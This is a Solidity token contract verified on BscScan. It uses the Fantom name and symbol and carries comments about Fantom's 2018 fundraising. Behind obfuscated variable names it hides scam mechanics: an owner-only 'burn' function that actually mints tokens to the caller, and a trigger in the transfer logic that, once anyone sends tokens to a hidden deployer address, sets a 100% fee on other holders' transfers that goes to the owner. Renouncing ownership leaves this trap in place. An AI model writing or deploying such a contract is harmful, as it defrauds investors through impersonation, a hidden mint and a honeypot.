/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

//////////////////////////////////////////////////////////////////////
//6 June 2018 — Fantom raised $40,000,000 (mostly in ETH @ $450-$700).
//Dec 2018 — Fantom sells the ETH to USD for an average price significantly less than it 
//raised. Fantom has less than $5,000,000 left.
//https://t.co/opTQKairAq
//https://twitter.com/AndreCronjeTech
//////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;
contract Fantom {
event Approval(address indexed owner, address indexed spender, uint256 value);
uint8 public constant decimals = 18;
uint256 private  ChnpdL = 10000000000000;
uint256 public  EMIlSu = 100000000000000000000;
uint256 public  erZFIi = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  TRDTRH = address(0);
address public  KbLUVE = address(0);
string public  name = "Fantom";
address public  flWwpf = address(0);
address private  CTdABF = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  vYgDHR = address(0);
address public  fNaDfn = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "Fantom";
address public  YjsRhM = address(0);
uint256 public  ImlxEu = 100000000000000000000000;
uint256 public  LRtyjB = 10000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant sGbeha = 9+1;
uint256 public  CXvcNc = 10000000000000000;
uint256 public  thJeyZ = 10000000000000000000;
uint256 public  Lzzcba = 100000000000000000000000;
address public owner;
uint256 public  yptXpG = 100000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () {
CTdABF = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "sDGFFh");
require(to != address(0), "sDGFFh");
require(amount <= balanceOf[from], "sDGFFh");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* sGbeha/ChnpdL ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==CTdABF){
ChnpdL = 9+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}